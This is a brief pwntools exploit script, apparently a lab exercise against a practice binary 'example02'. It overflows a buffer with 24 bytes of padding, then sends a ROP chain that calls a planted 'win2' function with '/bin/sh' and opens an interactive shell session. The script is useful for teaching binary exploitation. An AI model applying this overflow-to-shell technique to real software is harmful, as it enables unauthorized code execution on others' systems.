from pwn import *  # NOQA

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./example02')

gdb.attach(p, """
    # Optional GDB commands to run when connecting
""")

"""
ropchain = b''
ropchain += p64(0x40122b)  # pop rdi; ret
ropchain += p64(0x402035)  # "/bin/sh"
ropchain += p64(0x401158)  # win2
"""

rop = ROP('./example02')
binary = ELF('./example02')

rop.call('win2', [next(binary.search(b'/bin/sh\x00'))])
ropchain = rop.chain()

p.sendline(b'A' * 24 + ropchain)

p.interactive()
